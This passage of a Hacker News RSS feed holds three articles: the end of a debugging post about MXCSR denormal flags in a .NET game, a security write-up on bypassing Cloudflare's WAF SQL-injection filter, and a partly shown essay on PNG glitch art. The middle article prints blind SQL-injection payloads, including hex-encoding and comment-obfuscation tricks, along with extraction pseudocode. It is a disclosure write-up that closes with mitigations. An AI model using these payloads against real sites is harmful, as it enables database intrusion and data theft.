About the only meaningful discrepancy seemed to be the mystery <code>MXCSR</code> value, so it was time to investigate.</p>



<p>Before having departed on this journey, I have never really cared to look up anything about SSE/AVX registers.
Any readers that possess such knowledge have already spotted the problem in the screenshot above, but for those that presumably have never looked into anything of the sort, this section aims to be a brief recap.</p>

<p>The <code>vucomisd</code> instruction is a - watch out - <em>vectorised unordered compare of scalar double-precision floating point values</em> that happens to return its result in <code>EFLAGS</code>.
Let’s break this down further into constituent parts:</p>

<ul>
  <li>The <em>vectorised</em> part means SIMD (<em>single instruction, multiple data</em>).
SIMD instructions allow <em>data parallelisation</em> - on a concrete example, you can execute one common instruction simultaneously on <code>N</code> different values at a time.
Thankfully in this case that part isn’t really all that relevant.</li>
  <li>The <em>unordered</em> part relates to <code>NaN</code>s.
In IEEE 754 floating-point math, <code>NaN</code>s are special (and annoying) values that fail every comparison they’re part of (so a <code>NaN</code> is neither less, greater than or equal to any other number, including another <code>NaN</code>).</li>
  <li><em>Compare of scalar double-precision floating point values</em> sounds about right for what we wanted in the C# code to begin with.</li>
</ul>

<p>The result is returned in <code>EFLAGS</code>, which is a special quasi-register that is better viewed as a set of flags.
Here is the table describing the possible results of a <code>vucomisd</code> instruction:</p>

<table>
  <thead>
    <tr>
      <th>result</th>
      <th>zero flag (ZF)</th>
      <th>parity flag (PF)</th>
      <th>carry flag (CF)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>unordered (one of operands is a <code>NaN</code>)</td>
      <td>1</td>
      <td>1</td>
      <td>1</td>
    </tr>
    <tr>
      <td>greater than</td>
      <td>0</td>
      <td>0</td>
      <td>0</td>
    </tr>
    <tr>
      <td>less than</td>
      <td>0</td>
      <td>0</td>
      <td>1</td>
    </tr>
    <tr>
      <td>equal</td>
      <td>1</td>
      <td>0</td>
      <td>0</td>
    </tr>
  </tbody>
</table>

<p>Now, the <code>MXCSR</code> register is a special <em>control register</em>, in that it <em>controls</em> how the other SSE/AVX instructions execute.
In this particular case we’re interested in two related flags, one of which will turn out to be causing the madness.</p>

<ul>
  <li>Bit 15 of the register is <em>Flush To Zero (FTZ)</em>. Setting that bit will cause <em>writes</em> of denormal floating-point values to be coerced to zero.</li>
  <li>Bit 6 of the register is <em>Denormals Are Zero (DAZ)</em>. Setting that bit will cause <em>reads</em> of denormal floating-point values to be coerced to zero.</li>
</ul>

<p>This is immediately eye-catching in this particular scenario, as coercion to zero would definitively explain the differing equality result.
However, to confirm, let’s define what a <em>denormal value</em> is (because I didn’t know either).</p>

<p>A denormal value is a floating-point value that has leading zeroes in the significand (so it’s of the form 0.00…1…).
This can only happen if the exponent of the value is all zeroes - in that case, the implicit leading 1, normally assumed for any other exponent, is swapped for a zero.
Therefore, the largest denormal double-precision value is</p>

<div><div><pre><code>0b0 0000000000 1111111111111111111111111111111111111111111111111111 = 2.225073858507201e-308
  ± |exponent| |--------------mantissa/significand----------------|
</code></pre></div></div>

<p>Because <code>double.Epsilon</code> is essentially a <code>(uint64_t)0x1</code>, it definitely <em>is</em> a denormal number.
And, sure enough, as the screenshot above demonstrates, DAZ is <em>set</em> in the single-threaded case, in which the issue reproduces.</p>

<p>Incidentally, <code>MXCSR</code> (at least on Windows) is part of the thread context, which explains why the multi-threaded mode worked fine - it’s incredibly likely that the change also occurs in multi-threaded mode, but doesn’t affect other threads, including the one that does the bogus comparison, therefore effectively “hiding” the issue.</p>

<p>That answers the immediate question of what’s going wrong, but now there’s a <em>huge</em> problem - anyone could be writing a value to a register at any time, so <em>who is</em>?</p>



<p>This is <em>about</em> the point where I started freaking out.
The obvious first step for a programmer during a freak-out is to start frantically googling around for <em>something</em> that can be related, and so I made my way over to <a href="https://github.com/dotnet/runtime"><code>dotnet/runtime</code></a> and started typing in vaguely related terms.</p>

<p>Surprise, it wasn’t an issue in the runtime itself, but I <em>did</em> find a few important clues:</p>

<ul>
  <li>
    <p>First, I <a href="https://github.com/dotnet/runtime/blob/96f178d32b7ba62485917ac46ef1edcfd3c2d10d/src/coreclr/src/vm/cgensys.h#L157-L171">found calls</a> to the <code>_mm_setcsr()</code> x64 intrinsic, which set the value of <code>MXCSR</code>:</p>

    <div><div><pre><code>  <span>ResetProcessorStateHolder</span> <span>()</span>
  <span>{</span>
<span>#if defined(TARGET_AMD64)
</span>      <span>m_mxcsr</span> <span>=</span> <span>_mm_getcsr</span><span>();</span>
      <span>_mm_setcsr</span><span>(</span><span>0x1f80</span><span>);</span>
<span>#endif // TARGET_AMD64
</span>  <span>}</span>

  <span>~</span><span>ResetProcessorStateHolder</span> <span>()</span>
  <span>{</span>
<span>#if defined(TARGET_AMD64)
</span>      <span>_mm_setcsr</span><span>(</span><span>m_mxcsr</span><span>);</span>
<span>#endif // TARGET_AMD64
</span>  <span>}</span>
</code></pre></div>    </div>

    <p>This clearly shows that the runtime is aware of what a <code>MXCSR</code> is and it <em>does</em> try to restore the sane value of <code>0x1F80</code>, <em>sometimes</em>.
I didn’t follow up on when, because I figured it was <em>very</em> unlikely Microsoft engineers would overlook something of this magnitude, and it was probably something that we were doing, directly or indirectly.</p>
  </li>
  <li>
    <p>Secondly, I spotted <a href="https://github.com/dotnet/runtime/blob/56797842d45a0f55345842ab166618d0c153ec3c/src/coreclr/src/jit/utils.cpp#L2086-L2087">this comment</a>:</p>

    <div><div><pre><code><span>// Return Value:</span>
<span>//    True if 'x' is a power of two value and is not denormal (denormals may not be well-defined</span>
<span>//    on some platforms such as if the user modified the floating-point environment via a P/Invoke)</span>
</code></pre></div>    </div>

    <p>This rang several alarm bells immediately.
As a cross-platform .NET Core game with a bespoke framework, lazer has to make a <em>lot</em> of P/Invokes and native calling to <em>be</em> a game.
Combined with the fact that denormals/flush to zero are usually set by programs that …</p></li></ul></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html">https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html</a></em></p>]]>
            </description>
            <link>https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520728</guid>
            <pubDate>Fri, 18 Sep 2020 19:08:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I bypassed Cloudflare's SQL Injection filter]]>
            </title>
            <description>
<![CDATA[
Score 189 | Comments 84 (<a href="https://news.ycombinator.com/item?id=24520556">thread link</a>) | @gskourou
<br/>
September 18, 2020 | https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html | <a href="https://web.archive.org/web/*/https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        

<!--         <header class="post-header">
            <a id="blog-logo" href="">
                
                    <span class="blog-title">Astrocamel</span>
                
            </a>
        </header> -->

        <!-- <span class="post-meta">
            <time datetime="2020-09-04">04 Sep 2020</time>
            
                on Web
            
        </span> -->

        <!-- <h1 class="post-title">How I bypassed Cloudflare's SQL Injection filter</h1> -->

        <section>
            <p>In late 2018 I was tasked with performing a Web Application security assessment
for a large client.
After running the standard scans with automated tools, something interesting
came up: a possible SQL injection which couldn’t be exploited using the tool.
The reason: Cloudflare’s WAF and more specifically its SQL Injection filter.</p>

<h4 id="details-about-the-application">Details about the application</h4>
<p>The application was a generic website written in PHP with MySQL as the backend
DBMS. The vulnerable page submitted a POST request with multipart form body
data to the /index.php endpoint. I honestly don’t remember the use of the form
and it doesn’t really matter for the writeup. The POST request looked like this:</p>

<figure><pre><code data-lang="http"><span>POST</span> <span>/index.php</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>******</span>
<span>Connection</span><span>:</span> <span>close</span>
<span>Accept-Encoding</span><span>:</span> <span>gzip, deflate</span>
<span>Accept</span><span>:</span> <span>*/*</span>
<span>Content-Type</span><span>:</span> <span>multipart/form-data; boundary=dc30b7aab06d4aff91d4285d7e60d4f3</span>

--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="126"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="127"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="130"

...
...

###### #### 6 ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="task"

form.save
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="form_id"

X-MARK
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="96"

############
--dc30b7aab06d4aff91d4285d7e60d4f3

...
...

Content-Disposition: form-data; name="115[]"

########## ################## #### ###### ######
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="125"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3--</code></pre></figure>

<p>The unsanitized parameter at X-MARK can be used to inject arbitrary values at
the place of the WHERE clause of an SQL SELECT query.
For example, if the above data was sent as the body of the POST request, the
SQL query which would be executed on the server would look something like this:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>X</span><span>-</span><span>MARK</span><span>;</span></code></pre></figure>

<p>The technique typically used for this kind of injection is a Time-based Blind
SQL injection. The problem was, that Cloudflare would recognize these kinds of
injections and block them on the spot. No matter how complicated I tried to make
the query or how many sqlmap tamper scripts I used, Cloudflare was always there.</p>

<p>To overcome this issue, I used an observation I made while manually testing for
SQL injections on the same request:
I had noticed that when I tried to inject code that resulted in something close
to the following SQL query:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'a'</span><span>=</span><span>'a'</span><span>;</span></code></pre></figure>

<p>the web server responded with status 200 OK.
When I tried to inject code that resulted in something close to this SQL query:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'a'</span><span>=</span><span>'b'</span><span>;</span></code></pre></figure>

<p>the server responded with status 500 Internal Server Error.</p>

<p>In other words when the SQL query in the backend did NOT return results, the web
server complained and crashed (probably because the backend code tried to access
an item in the returned list whose index was out of range).
This gave me an idea: writing a script that compared a character picked from the
name of the required DBMS entity and sequentially compared it with all
characters. The idea was, if the two characters matched, the server would return
a 200 OK status, else it would return a 500 Internal Server Error status and I
would have to compare the requested character with the next character in my
list.</p>

<h4 id="first-try">First Try</h4>
<p>My thinking was that if a wanted to find the first second character of the name
of the fifth table (as they are listed in information_schema.tables), I would
start by asking MySQL if that character is equal to ‘a’ and if not I would
continue with ‘b’, ‘c’ etc. I would start by inject the following string (for
comparison with ‘a’):</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>table_name</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>tables</span>
  <span>LIMIT</span> <span>4</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>which would result in the following SQL query to be executed on the server:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span>
<span>WHERE</span> <span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>table_name</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>tables</span>
  <span>LIMIT</span> <span>4</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>When I found the table name to be t1 for example, I was to brute force its
columns’ names with the following starting injection:</p>

<p><em>INJECTION 1</em></p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>and then actually get values out of column c1 of table t1 by starting with the
following injection:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>c1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>t1</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>The idea was good, but Cloudflare would complain about the ‘=’ sign. The
injection</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span> <span>'b'</span></code></pre></figure>

<p>would get blocked by Cloudflare’s WAF. After a bit of fiddling, I came up with
the following request that bypassed the ‘=’ restriction:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>This means that the initial injection <em>INJECTION 1</em> would become:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<h4 id="second-try">Second Try</h4>
<p><em>INJECTION 1</em> was still not ready to go. Cloudflare would still complain about stuff.
More specifically the injection</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>would still get blocked, not because of the LIKE keyword, but because of the ‘a’
character. Comparing plain strings to anything was not allowed. To overcome this
issue I came up with the following injection that went through undetected by the
WAF:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>The above injection sends the character ‘a’ as the hex-encoded value ‘0x61’
which still allows it to work:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'a'</span></code></pre></figure>

<p>still returns True, and</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>passes through undetected and returns False.</p>

<p>The resulting <em>INJECTION 1</em> now looks like this:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<h4 id="third-try">Third Try</h4>
<p>The third obfuscation I had to enroll was a multi-line comment addition between
SQL query keywords. Cloudflare would block queries like this:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>but with a multi-line comment trick, the new query would go through undetected:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span><span>/*trick comment*/</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span>
<span>FROM</span><span>/*trick comment*/</span> <span>t1</span>
<span>WHERE</span> <span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>Thus, applying this method on <em>INJECTION 1</em>, would make it look like this:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span><span>/*trick comment*/</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span><span>/*trick comment*/</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>The above injection is in its final form and when passed as a form value to the
vulnerable web application the web server will reply with a 200 OK if the
character ‘a’ matches the first character of the first column’s name of table
t1.</p>

<h4 id="full-speed-ahead">Full Speed Ahead</h4>
<p>To make the retrieving of table contents from the application’s database easier
I wrote a script in Python to automate the process. The pseudocode of the script
goes something like this:</p>

<figure><pre><code data-lang="python"><span># assert names of columns and table name is known
</span><span>alphabet</span> <span>=</span> <span>[</span><span>a</span><span>,</span><span>b</span><span>,</span><span>c</span><span>,...,</span><span>y</span><span>,</span><span>z</span><span>]</span>
<span>characterPosition</span> <span>=</span> <span>1</span> <span># the position of the character we are bruteforcing
</span><span>for</span> <span>rowNumber</span> <span>in</span> <span>[</span><span>0</span><span>,</span><span>20</span><span>]:</span>
  <span>for</span> <span>columnName</span> <span>in</span> <span>columns</span><span>:</span>
    <span>for</span> <span>character</span> <span>in</span> <span>alphabet</span><span>:</span>
      <span>sqlInjection</span> <span>=</span> <span>'''
        0x{hex_encode(character)} LIKE (
        SELECT/*trick comment*/ SUBSTRING({columnName}, characterPosition,1)
        FROM/*trick comment*/ tableName
        LIMIT {rowNumber}, 1
        )
      '''</span>

      <span>inject</span> <span>sqlInjection</span> <span>is</span> <span>POST</span> <span>request</span> <span>body</span>
      <span>if</span> <span>response</span><span>.</span><span>status</span> <span>==</span> <span>200</span><span>:</span>
        <span>result</span> <span>+=</span> <span>character</span>
        <span>recurse</span> <span>function</span> <span>with</span> <span>characterPosition</span><span>++</span>
      <span>elif</span> <span>response</span><span>.</span><span>status</span> <span>==</span> <span>500</span><span>:</span>
        <span>continue</span> <span>with</span> <span>next</span> <span>character</span> <span>in</span> <span>alphabet</span>

      <span>return</span> <span>result</span></code></pre></figure>

<p>And this is how I bypassed Cloudflare WAF’s SQL injection protection. I got a
free t-shirt and a place in <a href="https://hackerone.com/gskourou">Cloudflare’s HoF</a>.</p>

<h4 id="mitigation">Mitigation</h4>
<p>Cloudlfare reviewed and fixed the vulnerability a few days after my report.</p>
<p>The safest way to mitigate SQL injections on your databases is prepared
statements. These come in most database interaction libraries for most
languages. You can find a full list of ways to mitigate SQL injections at
<a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP</a>.
It is my opinion that if developers take good care to apply security measures
on their applications, WAFs are most of the times unnecessary. All you need to
do is sanitize the users’ input properly.</p>


        </section>

        

        

    </article>

</div></div>]]>
            </description>
            <link>https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520556</guid>
            <pubDate>Fri, 18 Sep 2020 18:52:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Art of PNG Glitch]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 9 (<a href="https://news.ycombinator.com/item?id=24520201">thread link</a>) | @pmoriarty
<br/>
September 18, 2020 | https://ucnv.github.io/pnglitch/ | <a href="https://web.archive.org/web/*/https://ucnv.github.io/pnglitch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <header>
      <a title="PNGlitch" href="https://github.com/ucnv/pnglitch/"><img src="https://ucnv.github.io/pnglitch/files/forkme.png" alt="PNGlitch"></a>
      
    </header>
    <section>
      <h2>Overview</h2>
      <p>
      PNG is an image format that has a history of development beginning in 1995, and it is still a popular, long living format. Generally, it is known for its features such as lossless compression and  the ability to handle transparent pixels. <br>
      However, we do not look at image formats from a general point of view, but rather think of ways to glitch them. When we look at PNG from the point of view of glitch, what kind of peculiarity does it have?
      </p>
      <h3>Checksum</h3>
      <p>
      We should first look into the checksum system of the CRC32 algorithm. It is used to confirm corrupted images, and when it detects corruption in an image file, normal viewer applications refuse to display it. Therefore, it is impossible to generate glitches using simple methods such as rewriting part of the binary data using text editors or binary editors (you will completely fail). In other words, the PNG format is difficult to glitch. <br>
      We need to create glitches accordingly to the PNG specification in order to avoid this failure. This means that we must rewrite the data after decoding CRC32, re-calculate it and attach it to the edited data.
      </p>

      <h3>State</h3>
      <p>
      Next we want to look at the transcode process of PNG. The chart shown below is a simplified explanation of how PNG encoding flows.
      </p>
      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/states.png" alt="Figure 1)  PNG encoding flow">
        <figcaption>Figure 1) PNG encoding flow</figcaption>
      </figure>


      <p>
      Each of the four states that are shown above can be glitch targets. However, glitching the the first “Raw Data” is the same as glitching BMP, so it technically isn’t a PNG glitch (at the end, it is the same as PNG with the None filter applied. I will explain this in the next section). The final “Formatted PNG” glitch will not work because of the checksum system I mentioned above.<br>
      This means that PNG glitches can be made when the “Filtered Data” or “Compressed Data” is manipulated. I will explain about filters in the following subsection. When “Filtered Data” is glitched, it shows a distinctive effect; patterns that look like flower petals scatter around the image. The difference between the filters become clear when the “Filtered Data” is glitched. On the other hand, “Compressed Data” glitches are flavored by their own compression algorithm, which is Deflate compression. It shows an effect similar to a snow noise image.
      </p>
      <p>
      There are elements else besides the transcoding process that could also influence the appearance of glitches such as transparent pixels and interlaces.
      </p>
      <h3>Five filters</h3>
      <p>
      The factor that characterizes the appearance of glitches the most is the process called filter. The filter converts the uncompressed pixel data of each scanline using a certain algorithm in order to improve the compression efficiency. There are five types of filters that include four algorithms called Sub, Up, Average and Paeth, and also None (which means no filter applied). PNG images are usually compressed after the most suitable filter is applied to each scanline, and therefore all five filters are combined when PNG images are made.<br>
      These five filters usually only contribute to the compression efficiency, so the output result is always the same no matter which filter is applied. However, a clear difference appears in the output result when the filtered data is damaged. It is difficult to recognize the difference of the filters when an image is optimized and has all five filters combined, but the difference becomes obvious when an image is glitched when the same, single filter is applied to each scanline.<br>
      I will show the difference of the effect that each filter has later on, but when we look close into the results, we will understand which filter is causing which part of the beauty of PNG glitches (yes, they are beautiful) to occur.
      </p>
      <p>
        I will show the actual glitch results in the next section.
      </p>

      <h2>Glitching: In practice</h2>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png.png" alt="Figure 2) Original PNG image"></a>
        <figcaption>Figure 2) Original PNG image</figcaption>
      </figure>
      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-optimized.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-optimized.png" alt="Figure 3) Glitched PNG image"></a>
        <figcaption>Figure 3) Glitched PNG image</figcaption>
      </figure>
      <p>
      I have shown two PNG images above: one is an image before it has been glitched, and one is an image that has been glitched.<br>
      This is a Filtered Data glitch, which I explained in the previous section.<br>
      The original PNG has optimized filters applied to each scanline, and all of the five filters have been combined. The glitch reveals how the five filters were balanced when they were the combined.
      </p>
      <h3>Difference between filters</h3>
      <p>
      Lets look into the difference between each filter type.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-none.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-none.png" alt="Figure 4) Glitched PNG, filtered with None"></a>
        <figcaption>Figure 4) Glitched PNG, filtered with None</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-none-detail.png" alt="Figure 5) Magnified view of fig. 4">
        <figcaption>Figure 5) Magnified view of fig. 4</figcaption>
      </figure>
      <p>
      The image above has applied “None (no filter)”, meaning that it is a raw data glitch. Each pixel stands alone in this state and do not have any relationship with the others, so a single re-wrote byte does not have a wide range influence.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-sub.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-sub.png" alt="Figure 6) Glitched PNG, filtered with Sub"></a>
        <figcaption>Figure 6) Glitched PNG, filtered with Sub</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-sub-detail.png" alt="Figure 7) Magnified view of fig. 6">
        <figcaption>Figure 7) Magnified view of fig. 6</figcaption>
      </figure>
      <p>
      This is a glitched image that has the filter “Sub” applied to each scanline. When the Sub algorythm is applied, the target pixel rewrites itself by refering to the pixel that is right next to it. This is why the glitch pattern avalanches towards the right side.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-up.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-up.png" alt="Figure 8) Glitched PNG, filtered with Up"></a>
        <figcaption>Figure 8) Glitched PNG, filtered with Up</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-up-detail.png" alt="Figure 9) Magnified view of fig. 8">
        <figcaption>Figure 9) Magnified view of fig. 8</figcaption>
      </figure>
      <p>
      This is the filter “Up”. This filter is similar to Sub, but its reference direction is the top and bottom.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-average.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-average.png" alt="Figure 10) Glitched PNG, filtered with Average"></a>
        <figcaption>Figure 10) Glitched PNG, filtered with Average</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-average-detail.png" alt="Figure 11) Magnified view of fig. 10">
        <figcaption>Figure 11) Magnified view of fig. 10</figcaption>
      </figure>
      <p>
      The filter “Average” refers to a diagonal direction. It shows a meteor like tail that starts from the damaged pixel. The soft gradation effect is also one of the peculiarities of this filter. The result of a PNG glitch when the Average filter is applied is a glitch that lacks glitchiness, and is also the most delicate portion of PNG glitching.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-paeth.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-paeth.png" alt="Figure 12) Glitched PNG, filtered with Paeth"></a>
        <figcaption>Figure 12) Glitched PNG, filtered with Paeth</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-paeth-detail.png" alt="Figure 13) Magnified view of fig. 12">
        <figcaption>Figure 13) Magnified view of fig. 12</figcaption>
      </figure>
      <p>
      The filter “Paeth” has the most complicated algorithm when compared with the others. It also has the most complicated glitch effect. The glitch will affect a wide range of areas even with the least byte re-writing. The keynote effect of PNG glitch is caused by this filter; the figure shown in the original image is maintained, but is intensely destroyed at the same time.
      </p>

      <h3>Glitch after compression</h3>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-compressed.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-compressed.png" alt="Figure 14) Glitched PNG, after compressed"></a>
        <figcaption>Figure 14) Glitched PNG, after compressed</figcaption>
      </figure>

      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-compressed-detail.png" alt="Figure 15) Magnified view of fig. 14">
        <figcaption>Figure 15) Magnified view of fig. 14</figcaption>
      </figure>
      <p>
      This is a glitch of the state that I referred to as Compressed Data in the previous section. A snowstorm effect appears, and it is difficult to recognize the original figure in the image. It infrequently remains to show effects of the filters. The image is often completely destroyed.
      </p>
　
      <h3>Transparence</h3>
      <p>
      Lets look into what happens when an image that includes transparent pixels is glitched.
      </p>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-alpha.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-alpha.png" alt="Figure 16) Original PNG image"></a>
        <figcaption>Figure 16) Original PNG image with alpha pixels</figcaption>
      </figure>
      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-alpha.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-alpha.png" alt="Figure 17) Glitched PNG, with alpha pixels"></a>
        <figcaption>Figure 17) Glitched PNG, with alpha pixels</figcaption>
      </figure>
      <p>
      The transparency comes as an effect. Especially the filter “Average” seems to blend transparent pixels gradually.
      A 100% gathering of transparent pixels is handled in the same way as a solid colored section. You can tell that the filter “Up” is often applied to solid colored sections.<br>
      (There is a possibility that newer general-purpose image formats switch their compression scheme of each part depending on if the image is a solid colored section, or else a complicated image such as photographs. The use of images that include solid colored sections for testing glitches is an effective method. One example is a WebP. )
      </p>

      <h3>Interlace</h3>

      <figure>
        <a href="https://ucnv.github.io/pnglitch/files/png-glitch-interlace.png"><img src="https://ucnv.github.io/pnglitch/files/blank.png" data-src="files/png-glitch-interlace.png" alt="Figure 18) Glitched PNG, with interlace"></a>
        <figcaption>Figure 18) Glitched PNG, with interlace</figcaption>
      </figure>
      <figure>
        <img src="https://ucnv.github.io/pnglitch/files/png-glitch-interlace-detail.png" alt="Figure 19) Magnified view of fig. 18">
        <figcaption>Figure 19) Magnified view of fig. 18</figcaption>
      </figure>
      <p>
        PNG interlaces are divided into seven passes, using the Adam7 algorithm based on 8x8 pixels. We are able to visualy observe that algorithm when an interlaced PNG is glitched. We can also confirm a stitched effect, and that its angle has become narrow towards the Average filter (see appendix B).
      </p>

      <h2>Conclusion</h2>
      <p>
